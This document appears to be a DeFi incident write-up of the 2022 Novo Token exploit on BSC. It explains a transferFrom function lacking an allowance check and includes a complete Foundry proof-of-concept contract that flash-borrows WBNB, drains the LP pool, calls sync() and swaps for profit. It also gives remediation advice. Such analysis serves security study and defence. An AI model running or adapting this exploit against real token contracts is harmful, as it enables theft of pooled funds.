# Novo Token — Direct LP transferFrom Drain Analysis

| Field | Details |
|------|------|
| **Date** | 2022-05-20 |
| **Protocol** | Novo Token (NOVO) |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$90,000 (in WBNB) |
| **Attacker** | [0x31a7cc04987520cefacd46f734943a105b29186e](https://bscscan.com/address/0x31a7cc04987520cefacd46f734943a105b29186e) |
| **Attack Contract** | [0x3463a663de4ccc59c8b21190f81027096f18cf2a](https://bscscan.com/address/0x3463a663de4ccc59c8b21190f81027096f18cf2a) |
| **Vulnerable Contract** | NOVO Token [0x6Fb2020C236BBD5a7DDEb07E14c9298642253333](https://bscscan.com/address/0x6Fb2020C236BBD5a7DDEb07E14c9298642253333) |
| **Root Cause** | NOVO token's `transferFrom()` function does not validate the allowance for the `from` parameter, allowing anyone to arbitrarily transfer tokens held by the LP pool |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-05/Novo_exp.sol) |

---
## 1. Vulnerability Overview

Novo Token (NOVO)'s `transferFrom()` implementation omits or incorrectly implements the `allowance` validation required by the ERC20 standard. A standard `transferFrom(from, to, amount)` implementation must verify the condition `allowance[from][msg.sender] >= amount`, but NOVO failed to do so correctly.

The attacker borrowed 17.2 WBNB via a PancakeSwap flash swap, then directly called `NOVO.transferFrom(NOVO_LP_Pool, attacker, balance)` to transfer approximately 113.95 billion NOVO tokens held by the LP pool to themselves without authorization. They then called `sync()` to manipulate the LP price and swapped their NOVO holdings for WBNB to realize profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable NOVO transferFrom (pseudocode)
contract NovoToken {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    // ❌ allowance validation missing or bypassable
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        // ❌ msg.sender's allowance is not validated
        // or there is a bug in the allowance validation logic that permits arbitrary from
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}

// ✅ Correct ERC20 transferFrom pattern
contract NovoTokenFixed {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        // ✅ Validate msg.sender's allowance for sender
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: insufficient allowance");

        _allowances[sender][msg.sender] = currentAllowance - amount;
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompilation


**Novo_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: NOVO token's `transferFrom()` function does not validate the allowance for the `from` parameter, allowing anyone to arbitrarily transfer tokens held by the LP pool
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] PancakeSwap flash swap: borrow 17.2 WBNB
    │       IPancakePair(0xEeBc161437FA948AAb99383142564160c92D2974)
    │       .swap(0, 17.2 WBNB, address(this), "attack")
    │
    ├─[2] [Inside pancakeCall callback]
    │       │
    │       ├─ WBNB → ~4.75 trillion NOVO swap
    │       │       PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransfer()
    │       │       (WBNB → NOVO, 17.2 WBNB in)
    │       │
    │       ├─ NOVO.transferFrom(NOVO_LP, attacker, 113,950,000,000)
    │       │       ⚡ No allowance check → drain all NOVO from LP
    │       │       NOVO LP [0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D]
    │       │
    │       ├─ NOVO_LP.sync()
    │       │       Update reserves to current balances (NOVO greatly reduced)
    │       │       → NOVO price manipulation (NOVO in LP decreases → price rises)
    │       │
    │       ├─ Held NOVO → WBNB swap
    │       │       PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransfer()
    │       │       Swap at manipulated high price → realize profit
    │       │
    │       └─ Repay flash swap: return 17.2 WBNB + fee
    │
    └─[3] Secure profit WBNB
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface INOVO {
    // ⚡ Vulnerable function: transferFrom with no allowance check
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface INOVOLP {
    // Update reserves to current balances
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin,
        address[] calldata path, address to, uint deadline
    ) external;
}

contract ContractTest is Test {
    INOVO   NOVO       = INOVO(0x6Fb2020C236BBD5a7DDEb07E14c9298642253333);
    IERC20  WBNB       = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    INOVOLP novoLP     = INOVOLP(0x128cd0Ae1a0aE7e67419111714155E1B1c6B2D8D);
    INOVOLP flashPair  = INOVOLP(0xEeBc161437FA948AAb99383142564160c92D2974);
    IPancakeRouter router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        vm.createSelectFork("bsc");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Before] WBNB", WBNB.balanceOf(address(this)), 18);

        // [Step 1] Borrow 17.2 WBNB via flash swap
        flashPair.swap(0, 172e17, address(this), abi.encode("attack"));

        emit log_named_decimal_uint("[After] WBNB profit", WBNB.balanceOf(address(this)), 18);
    }

    function pancakeCall(address, uint256, uint256 amount1, bytes calldata) external {
        // [Step 2] Swap borrowed WBNB → NOVO
        WBNB.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB); path[1] = address(NOVO);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount1, 0, path, address(this), block.timestamp
        );

        // [Step 3] ⚡ Exploit vulnerability: drain NOVO directly from LP pool without allowance
        uint256 lpBalance = NOVO.balanceOf(address(novoLP));
        NOVO.transferFrom(address(novoLP), address(this), lpBalance);

        // [Step 4] Update LP reserves via sync() (price manipulation)
        novoLP.sync();

        // [Step 5] Swap drained NOVO → WBNB
        NOVO.approve(address(router), type(uint256).max);
        path[0] = address(NOVO); path[1] = address(WBNB);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            NOVO.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // Repay flash swap (including PancakeSwap fee)
        uint256 repay = amount1 * 10000 / 9975 + 1;
        WBNB.transfer(address(flashPair), repay);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | ERC20 transferFrom allowance validation missing |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Allowance bypass in custom ERC20 implementation |
| **Attack Vector** | Direct call to `transferFrom(LP_pool, attacker, balance)` |
| **Preconditions** | None (anyone can drain LP pool balance) |
| **Impact** | Full drain of all NOVO tokens held in the LP pool |

---
## 6. Remediation Recommendations

1. **Use OpenZeppelin ERC20**: Instead of a custom ERC20 implementation, use the audited OpenZeppelin `ERC20.sol` to guarantee standard `transferFrom` allowance validation.
2. **Mandatory Allowance Check**: In `transferFrom`, always validate the condition `_allowances[sender][msg.sender] >= amount`.
3. **Pre-deployment ERC20 Conformance Testing**: Use an ERC20 standard conformance test suite to verify `transferFrom` allowance handling before deployment.
4. **Slither Static Analysis**: Use Slither's `erc20-interface` detector to proactively identify non-standard ERC20 implementations.

---
## 7. Lessons Learned

- **Same Pattern as CFToken**: Similar to the CF Token attack in April 2022 (public `_transfer` exposure), fundamental security flaws in custom ERC20 implementations continue to repeat.
- **LP Pool as a Direct Target**: Without allowance validation, all tokens held by the LP pool become a direct attack target.
- **sync() Price Manipulation Combination**: Calling `sync()` after draining tokens further manipulates the LP price, enabling double profit.
- **Risk of Custom Tokens on BSC**: The same attack continues to recur against small tokens in the BSC ecosystem that use unaudited custom ERC20 implementations.